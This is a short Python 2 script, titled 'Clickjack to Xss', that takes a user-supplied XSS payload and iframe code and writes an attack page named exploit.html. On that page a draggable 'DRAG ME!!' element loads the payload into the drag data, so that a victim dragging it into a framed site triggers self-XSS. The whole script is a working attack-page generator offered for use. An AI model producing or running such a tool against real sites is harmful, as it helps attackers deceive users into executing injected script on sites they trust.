print "Clickjack to Xss"
vector=raw_input('xss vector--> ') #xss payload
html=raw_input('Custom Iframe Code--> ') #custom iframe code

fo=open('exploit.html','w') #creating html file 

source_code="""<html><body>
<h1>Clickjack to exploit self xss </h1>
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain', '%s')"><h3>DRAG ME!!</h3></div>
"""%(vector)

fo.write(source_code)
fo=open('exploit.html','a')
fo.write(html)
fo.write('</body></html>')
fo.close() #closing the file 
print "file created"
